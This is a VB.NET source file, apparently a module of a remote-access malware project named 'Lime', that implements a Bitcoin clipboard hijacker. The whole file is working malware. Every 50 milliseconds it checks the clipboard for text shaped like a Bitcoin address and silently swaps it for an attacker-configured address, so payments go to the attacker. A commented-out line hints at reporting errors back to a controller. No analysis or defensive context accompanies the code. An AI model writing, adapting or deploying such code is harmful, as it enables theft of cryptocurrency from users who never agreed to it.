Namespace Lime

    Public Class C_BTC
        Public Shared Sub _BTC_ST()
            Dim Clipboard As String = ""
            While True
                Try
                    'the address always start with 1 or 3 or bc1
                    'the length is between 26-35 characters
                    'more info https://en.bitcoin.it/wiki/Address
                    Clipboard = My.Computer.Clipboard.GetText
                    If (Clipboard <> C_Settings.BTC_ADDR) Then
                        If Clipboard.Length >= 26 AndAlso Clipboard.Length <= 35 Then
                            If Clipboard.StartsWith("1") OrElse Clipboard.StartsWith("3") OrElse Clipboard.StartsWith("bc1") Then
                                Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf My.Computer.Clipboard.SetText)
                                _BTC.SetApartmentState(Threading.ApartmentState.STA)
                                _BTC.Start(C_Settings.BTC_ADDR)
                            End If
                        End If
                    End If
                    Threading.Thread.Sleep(50)
                Catch ex As Exception
                    '  C_Main.C.Send("MSG" + C_Main.SPL + "BTC Error! " + ex.Message)
                End Try
            End While
        End Sub
    End Class
End Namespace
